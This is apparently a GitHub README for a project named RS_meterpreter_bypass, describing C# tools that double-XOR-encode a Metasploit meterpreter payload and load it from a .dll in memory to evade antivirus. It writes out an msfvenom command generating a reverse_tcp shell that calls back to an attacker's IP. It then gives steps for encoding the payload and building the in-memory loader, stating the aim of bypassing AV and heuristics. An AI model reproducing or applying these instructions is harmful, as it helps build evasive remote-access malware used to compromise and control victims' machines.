# RS_meterpreter_bypass
These two C# programs are used to encode and create a .dll file from a starting metasploit xor encoded reverse_tcp payload.

# How to use
Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f csharp -e x64/xor_dynamic

Take note of the *buf* variable showed in output.

Now we use our [_XOR_encoder_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/XOR_encoder.cs), open this in a new console project on Visual Studio Community and build an executable solution.

- Remember to change the byte array *buf*


We have now a double XOR-encoded shellcode, to bypass AV we will create a .dll to run in memory. We will use [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs) which is used to execute our payload and also bypass heuristics
